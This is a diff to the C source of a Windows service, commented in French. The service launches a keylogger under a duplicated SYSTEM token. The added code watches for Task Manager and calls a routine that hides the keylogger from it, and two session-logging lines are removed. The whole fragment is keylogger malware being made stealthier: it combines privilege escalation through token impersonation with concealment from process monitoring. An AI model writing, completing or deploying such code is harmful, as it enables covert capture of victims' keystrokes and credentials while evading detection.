@@ -23,6 +23,11 @@ VOID SvcInit(DWORD ac, LPTSTR *av)
 {
     (void)ac;
     PROCESS_INFORMATION keylogInfo;
+    char *taskmgr = "Taskmgr.exe";
+    HANDLE hThread = NULL;
+    DWORD taskmgrPID = 1;
+    DWORD taskmgrPIDtmp = 1;
+
     // un event sera cree lorsque le service stoppera
     svcStopEvt = CreateEvent(NULL, TRUE, FALSE, NULL);
     if (svcStopEvt == NULL)
@@ -33,11 +38,26 @@ VOID SvcInit(DWORD ac, LPTSTR *av)
     //on previent le gestionnaire de service que le service a demarre
     ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);
     //On duplique le token systeme, puis on lance le programme avec
-    log("\nLa session utilisee est >\n");
-    log(av[1]);
     ImpersonateSystemTokenAndLaunchKeylogger(&keylogInfo, atoi(av[1]));
     while (1)
     {
+        taskmgrPID =  GetPIDByProcName(taskmgr);
+        if (taskmgrPID != 1 && taskmgrPID != taskmgrPIDtmp)
+        {
+            taskmgrPIDtmp = taskmgrPID;
+            if (hThread == NULL)
+                hThread = HideKeyloggerFromTaskmgr(taskmgrPID);
+            if (hThread == NULL) taskmgrPIDtmp = 1;// if HideKeyloggerFromTaskmgr fails, try again next loop.
+        }
+        if (hThread)
+        {
+            DWORD threadExit = WaitForSingleObject(hThread, 1);
+            if (threadExit == WAIT_OBJECT_0)
+            {
+                CloseHandle(hThread);
+                taskmgrPIDtmp = 1;
+            }
+        }
         DWORD stopEvt = WaitForSingleObject(svcStopEvt, 1);
         if (stopEvt == WAIT_OBJECT_0)
         {
